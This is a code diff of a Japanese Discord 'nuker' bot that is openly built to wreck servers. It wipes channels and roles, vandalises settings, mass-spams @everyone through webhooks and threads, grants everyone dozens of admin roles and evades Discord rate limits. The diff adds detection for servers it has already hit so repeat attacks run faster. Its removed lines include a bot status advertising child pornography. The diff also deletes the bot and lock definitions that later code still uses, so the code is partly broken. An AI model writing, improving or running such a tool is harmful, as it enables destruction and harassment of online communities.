@@ -3,18 +3,26 @@
 ================================================================
   TOISHIN NUKER  -  垢飛ばしツール (discord.py)  MAX 構成
 ================================================================
-  !toishin  ->  コミュニティON → 全削除(ADMIN-xxは温存) → 設定破壊
-                → 大量生成 → 連投 → 施錠 → 退出
-  !admin    ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
-                以後の新規参加者にも、参加した瞬間から同じロールを自動付与
-  !auto     ->  自動付与の状態確認
-  !autoadmin on|off ->  自動付与の手動ON/OFF
+  !toishin        ->  通常 (既にヌケ済みなら自動でスキップ実行)
+  !toishin full   ->  検知を無視して全部やる
+  !nukestate      ->  ヌケ済み判定の確認
+  !admin          ->  全員に管理者ロール50個付与 (退出しない / 通知なし)
+  !auto / !autoadmin on|off
+================================================================
+  【再ヌケのスキップ】
+    既にヌケ済みと判定した場合、以下を飛ばす
+      - チャンネル全削除 / 全作成  → 既存chを再利用
+      - ロール全削除 / カオスロール作成 / 全員付与
+      - 設定破壊
+    連投・招待・Webhook・スレッド・施錠は毎回やる
+    再利用時は先に slowmode と権限を解除してから撃つ
+    判定材料は「サーバー名 / ADMINロール数 / 生成ch数」の3つ
+    (コミュニティ有効は通常サーバーでも普通なので判定に使わない)
 ================================================================
   【レート制御】
     - 全送信はトークンバケツ(既定40/s)を1枚通してから発火
     - Retry-After が BIG_429_SECONDS 以上 or グローバル429 → 全APIを即凍結
-      凍結中は一切リクエストを出さない(叩き続けないので最速で明ける)
-    - 明けたらレート半減から 5/s ずつ戻す
+    - 明けたらレート半減から段階的に戻す
     - 凍結 RECONNECT_AFTER_FREEZE 回ごとに WebSocket を張り直す
 ================================================================
   【退出保証】
@@ -30,6 +38,7 @@ import asyncio
 import logging
 import os
 import random
+import re
 import time
 
 import aiohttp
@@ -81,6 +90,12 @@ GUILD_ICON_URL   = None
 ADMIN_NOTIFY     = False
 ADMIN_ROLE_COUNT = 50
 ADMIN_AUTO_GRANT = True         # !admin 後、新規参加者にも自動で同じロールを即付与
+
+# ==================== 再ヌケのスキップ ====================
+SKIP_IF_NUKED      = True       # ヌケ済みなら削除/作成/付与を飛ばす
+MIN_REUSE_CHANNELS = 10         # 再利用chがこれ未満なら通常実行に戻す
+DETECT_ADMIN_MIN   = 10         # ADMINロールがこの数以上でヌケ済み
+DETECT_CHAOS_MIN   = 10         # 生成chがこの数以上でヌケ済み
 
 # ==================== 送信ペース ====================
 SPAM_RATE        = 40.0         # 1秒あたりの送信数 (Discord全体上限は約50/s)
@@ -147,7 +162,7 @@ NAME_POOL = [
 ROLE_NAME_POOL = [
     "管理者", "モデレーター", "神", "運営", "サブ垢", "本垢", "Bot", "Lv100",
     "VIP", "プレミアム", "課金勢", "無課金", "古参", "新参", "荒らし", "養分",
-    "常連", "一見", "中の人", "裏方", "実質王", "雑用",
+    "常連", "一見", "の中人", "裏方", "実質王", "雑用",
 ]
 
 EMOJI_POOL = [
@@ -166,6 +181,9 @@ TWEMOJI_CODES = [
     "1f912", "1f915", "1f922", "1f92c", "1f97d", "1f440", "1f4af", "1f525",
 ]
 TWEMOJI_URL = "https://cdn.jsdelivr.net/gh/jdecked/twemoji@latest/assets/72x72/{}.png"
+
+# 生成chの名前パターン (「-012-😂🤣🤪」の形)
+CHAOS_NAME_RE = re.compile(r"-\d{3}-.{1,20}$")
 
 
 # ============================ ログ ============================
@@ -242,7 +260,6 @@ async def _reopen_worker() -> None:
             break
         await asyncio.sleep(min(remain, 1.0))
 
-    # 少し余白を置いてから開ける (境界で即429を食わないため)
     await asyncio.sleep(random.uniform(0.4, 1.2))
     GATE.set()
     log.info("=== 凍結解除。再開 (レート %.0f/s) ===", PACER["rate"])
@@ -258,7 +275,6 @@ async def _reopen_worker() -> None:
 
 
 def _freeze(seconds: float) -> None:
-    """全APIを停止する。既にそれ以上長く止まっているなら何もしない"""
     if seconds <= 0:
         return
     target = time.monotonic() + seconds
@@ -280,7 +296,6 @@ def _freeze(seconds: float) -> None:
 
 
 async def acquire_token() -> None:
-    """送信前に通すトークンバケツ。凍結中はゲートで待つ"""
     while True:
         if not GATE.is_set():
             await GATE.wait()
@@ -323,7 +338,6 @@ async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
                     _note_global(e)
 
                 if is_global or wait >= BIG_429_SECONDS:
-                    # 大物: 全APIを凍結して静かにさせる
                     _freeze(wait)
                     await GATE.wait()
                 else:
@@ -430,35 +444,55 @@ def panic_skip(stage: str) -> bool:
     return False
 
 
-# ============================ Bot ============================
-intents = discord.Intents.default()
-intents.guilds = True
-intents.members = True
-intents.message_content = True
-
-bot = commands.Bot(
-    command_prefix="!",
-    intents=intents,
-    case_insensitive=True,
-    max_messages=None,
-    allowed_mentions=discord.AllowedMentions(everyone=True, roles=False, users=False),
-    activity=discord.Activity(type=discord.ActivityType.watching, name="児童ポルノ販売中"),
-    chunk_guilds_at_startup=False,
-)
-
-NUKE_LOCK = asyncio.Lock()
-RETRY = {"delay": 30.0}
-
-AUTO_GRANT: dict[int, list[str]] = {}
-AUTO_GRANT_SEM = asyncio.Semaphore(MEMBER_CONCURRENCY)
+# ================== ヌケ済み判定 ==================
+def nuked_reasons(guild: discord.Guild) -> list[str]:
+    """コミュニティ有効は通常サーバーでも普通なので判定に含めない"""
+    hits = []
+    if guild.name == GUILD_NAME:
+        hits.append("名前")
+    if sum(1 for r in guild.roles if is_admin_role(r)) >= DETECT_ADMIN_MIN:
+        hits.append("ADMINロール")
+    if sum(1 for c in guild.text_channels if CHAOS_NAME_RE.search(c.name)) >= DETECT_CHAOS_MIN:
+        hits.append("生成ch")
+    return hits
 
 
-def resolve_auto_roles(guild: discord.Guild) -> list[discord.Role]:
-    names = AUTO_GRANT.get(guild.id)
-    if not names:
-        return []
-    wanted = set(names)
-    return [r for r in guild.roles if r.name in wanted]
+def looks_nuked(guild: discord.Guild) -> bool:
+    return bool(nuked_reasons(guild))
+
+
+def reusable_channels(guild: discord.Guild) -> list[discord.TextChannel]:
+    """流用できる通常テキストch (rules / お知らせ は除外)"""
+    rules = guild.rules_channel
+    news = guild.public_updates_channel
+    out = []
+    for c in guild.text_channels:
+        if c.type is not discord.ChannelType.text:
+            continue
+        if c is rules or c is news:
+            continue
+        out.append(c)
+    return out
+
+
+async def unlock_for_spam(guild: discord.Guild,
+                          chs: list[discord.TextChannel]) -> None:
+    """再利用chを撃てる状態に戻す (低速解除 + 権限を戻す)"""
+    sem = asyncio.Semaphore(DELETE_CONCURRENCY)
+
+    async def one(ch):
+        async with sem:
+            await safe(ch.edit, slowmode_delay=0,
+                       reason="TOISHIN NUKE", label=f"unlock:{ch.name}")
+            await safe(ch.set_permissions, guild.default_role,
+                       view_channel=True, send_messages=True,
+                       send_messages_in_threads=True, add_reactions=True,
+                       create_public_threads=True, create_private_threads=True,
+                       attach_files=True, embed_links=True,
+                       use_external_emojis=True,
+                       reason="TOISHIN NUKE", label=f"unlockperm:{ch.name}")
+
+    await asyncio.gather(*(one(c) for c in chs))
 
 
 # ================== コミュニティ有効化 ==================
@@ -552,15 +586,37 @@ async def bind_community_channels(guild: discord.Guild,
 
 
 # ========================= ヌケ本体 =========================
-async def _nuke_body(guild: discord.Guild, el) -> None:
-    # ---------- 0) コミュニティ有効化 (削除より前) ----------
-    if ENABLE_COMMUNITY and not panic_skip("コミュニティON"):
+async def _nuke_body(guild: discord.Guild, el, force_full: bool = False) -> None:
+    nuked = (not force_full) and SKIP_IF_NUKED and looks_nuked(guild)
+    if nuked:
+        log.info("=== ヌケ済み判定 (%s)。削除/作成/付与をスキップ ===",
+                 ", ".join(nuked_reasons(guild)))
+    elif force_full:
+        log.info("=== full 指定。スキップなし ===")
+
+    # ---------- 0) コミュニティ有効化 ----------
+    if ENABLE_COMMUNITY and "COMMUNITY" not in guild.features \
+            and not panic_skip("コミュニティON"):
         log.info("[0/8] コミュニティ有効化 …")
         await enable_community(guild)
         log.info("      -> %s / %s", "ON" if "COMMUNITY" in guild.features else "OFF", el())
 
-    # ---------- 1) 全チャンネル / カテゴリ削除 ----------
-    if not panic_skip("チャンネル削除"):
+    created: list[discord.TextChannel] = []
+
+    # ---------- 1) 再利用 or 全削除 ----------
+    if nuked:
+        reuse = reusable_channels(guild)
+        if len(reuse) >= MIN_REUSE_CHANNELS:
+            log.info("[1/8] 既存ch %d 個を再利用。削除/作成スキップ …", len(reuse))
+            await unlock_for_spam(guild, reuse)
+            created = reuse
+            log.info("      -> 再利用準備完了 / %s", el())
+        else:
+            nuked = False
+            log.info("[1/8] 再利用できるchが %d 個しかない。通常実行に切替 …",
+                     len(reuse))
+
+    if not nuked and not panic_skip("チャンネル削除"):
         log.info("[1/8] 既存チャンネル全削除 …")
         targets = list(guild.channels)
         normal = [c for c in targets if not isinstance(c, discord.CategoryChannel)]
@@ -575,8 +631,8 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
         await asyncio.gather(*(kill(c) for c in cats))
         log.info("      -> 削除完了 %d ch / %s", len(targets), el())
 
-    # ---------- 2) ロール全削除 (ADMIN-xx は温存) ----------
-    if NUKE_ROLES and not panic_skip("ロール削除"):
+    # ---------- 2) ロール全削除 (スキップ対象) ----------
+    if not nuked and NUKE_ROLES and not panic_skip("ロール削除"):
         log.info("[2/8] 既存ロール全削除 …")
         roles, kept = [], []
         for r in guild.roles:
@@ -596,6 +652,8 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
         await asyncio.gather(*(kill_role(r) for r in roles))
         log.info("      -> ロール削除 %d 個 / ADMIN-xx 温存 %d 個 / %s",
                  len(roles), len(kept), el())
+    elif nuked:
+        log.info("[2/8] ロール削除スキップ (現状 %d ロール維持)", len(guild.roles))
 
     # ---------- 3) 絵文字 / スタンプ削除 ----------
     if not panic_skip("絵文字/スタンプ削除"):
@@ -611,25 +669,29 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
 
     # ---------- 4) サーバー設定破壊 ----------
     if not panic_skip("設定破壊"):
-        log.info("[4/8] サーバー設定破壊 …")
-        kwargs = {"name": GUILD_NAME, "reason": "TOISHIN NUKE",
-                  "preferred_locale": "ja"}
-        if PING_ALL:
-            kwargs["default_notifications"] = discord.NotificationLevel.all_messages
-        if VERIF_HIGH:
-            kwargs["verification_level"] = discord.VerificationLevel.highest
-            kwargs["explicit_content_filter"] = discord.ContentFilter.all_members
-        if GUILD_ICON_URL:
-            try:
-                kwargs["icon"] = await fetch_bytes(GUILD_ICON_URL)
-            except Exception:
-                log.warning("アイコン取得失敗 -> 名前だけ変更")
-        await safe(guild.edit, label="guild:edit", **kwargs)
-        log.info("      -> 設定破壊完了 / %s", el())
+        need = (guild.name != GUILD_NAME) or (not nuked)
+        if need:
+            log.info("[4/8] サーバー設定破壊 …")
+            kwargs = {"name": GUILD_NAME, "reason": "TOISHIN NUKE",
+                      "preferred_locale": "ja"}
+            if PING_ALL:
+                kwargs["default_notifications"] = discord.NotificationLevel.all_messages
+            if VERIF_HIGH:
+                kwargs["verification_level"] = discord.VerificationLevel.highest
+                kwargs["explicit_content_filter"] = discord.ContentFilter.all_members
+            if GUILD_ICON_URL:
+                try:
+                    kwargs["icon"] = await fetch_bytes(GUILD_ICON_URL)
+                except Exception:
+                    log.warning("アイコン取得失敗 -> 名前だけ変更")
+            await safe(guild.edit, label="guild:edit", **kwargs)
+            log.info("      -> 設定破壊完了 / %s", el())
+        else:
+            log.info("[4/8] 設定は既に破壊済み。スキップ")
 
     # ---------- 5) カテゴリ作成 ----------
     cat_list: list[discord.CategoryChannel] = []
-    if USE_CATEGORIES and not panic_skip("カテゴリ作成"):
+    if USE_CATEGORIES and not nuked and not panic_skip("カテゴリ作成"):
         log.info("[5/8] カテゴリ %d 個作成 …", CATEGORY_COUNT)
         sem_c = asyncio.Semaphore(EXTRA_CONCURRENCY)
 
@@ -642,9 +704,8 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
             *(make_cat(n) for n in build_category_names())) if c]
         log.info("      -> カテゴリ %d 個 / %s", len(cat_list), el())
 
-    # ---------- 6) チャンネル作成 ----------
-    created: list[discord.TextChannel] = []
-    if not panic_skip("チャンネル作成"):
+    # ---------- 6) チャンネル作成 (スキップ対象) ----------
+    if not nuked and not panic_skip("チャンネル作成"):
         log.info("[6/8] チャンネル %d 個作成 …", CHANNEL_COUNT)
         names = build_channel_names()
         sem_new = asyncio.Semaphore(CREATE_CONCURRENCY)
@@ -666,7 +727,7 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
             await bind_community_channels(guild, created)
 
     # ---------- 7) 招待 / Webhook / スレッド ----------
-    pool = created or list(guild.channels)
+    pool = created or list(guild.text_channels)
     if pool and not panic_skip("招待/Webhook/スレッド"):
         sem_x = asyncio.Semaphore(EXTRA_CONCURRENCY)
 
@@ -698,7 +759,7 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
         )
         log.info("      -> 生成完了 / %s", el())
 
-    # ---------- 8) カオスロール作成 + 全員付与 (連投と並行) ----------
+    # ---------- 8) カオスロール作成 + 全員付与 (スキップ対象) ----------
     async def chaos_roles():
         if not CREATE_ROLES or PANIC["on"]:
             return
@@ -767,9 +828,12 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
                     await asyncio.sleep(SPAM_STAGGER)
             await asyncio.gather(*tasks)
 
-        await asyncio.gather(chaos_roles(), launch())
+        if nuked:
+            await launch()
+        else:
+            await asyncio.gather(chaos_roles(), launch())
         log.info("      -> 送信/付与完了 / %s", el())
-    else:
+    elif not nuked:
         await chaos_roles()
 
     # ---------- 10) 施錠 (低速 + 送信権剥奪) ----------
@@ -833,7 +897,7 @@ async def watchdog(task: asyncio.Task) -> None:
         await asyncio.sleep(0.5)
 
 
-async def run_nuke(guild: discord.Guild) -> None:
+async def run_nuke(guild: discord.Guild, force_full: bool = False) -> None:
     t0 = time.perf_counter()
     el = lambda: f"{time.perf_counter() - t0:.1f}s"
 
@@ -844,10 +908,10 @@ async def run_nuke(guild: discord.Guild) -> None:
     COOLDOWN.update(until=0.0, task=None, hits=0)
     GATE.set()
 
-    log.info("=== NUKE START | %s (%s) | 作業枠 %.0fs + 退出枠 %ds | %.0f token/s ===",
-             guild.name, guild.id, budget, LEAVE_RESERVE, SPAM_RATE)
+    log.info("=== NUKE START | %s (%s) | 作業枠 %.0fs + 退出枠 %ds | full=%s ===",
+             guild.name, guild.id, budget, LEAVE_RESERVE, force_full)
 
-    task = asyncio.create_task(_nuke_body(guild, el))
+    task = asyncio.create_task(_nuke_body(guild, el, force_full))
     wd = asyncio.create_task(watchdog(task))
 
     try:
@@ -866,11 +930,26 @@ async def run_nuke(guild: discord.Guild) -> None:
 
 @bot.command(name="toishin", aliases=["nuke", "t"])
 @commands.guild_only()
-async def toishin(ctx: commands.Context):
+async def toishin(ctx: commands.Context, mode: str = ""):
     if NUKE_LOCK.locked():
         return
+    force_full = mode.lower() in ("full", "all", "全部")
     async with NUKE_LOCK:
-        await run_nuke(ctx.guild)
+        await run_nuke(ctx.guild, force_full)
+
+
+@bot.command(name="nukestate")
+@commands.guild_only()
+async def nukestate_cmd(ctx: commands.Context):
+    hits = nuked_reasons(ctx.guild)
+    reuse = len(reusable_channels(ctx.guild))
+    if hits:
+        await ctx.send(f"ヌケ済み判定: **該当** ({', '.join(hits)}) / "
+                       f"再利用可能ch {reuse}\n→ `!toishin` でスキップ実行、"
+                       f"`!toishin full` で全部やる")
+    else:
+        await ctx.send(f"ヌケ済み判定: 該当なし / 再利用可能ch {reuse}\n"
+                       f"→ `!toishin` は通常実行になる")
 
 
 # ==================== !admin 用ヘルパー ====================
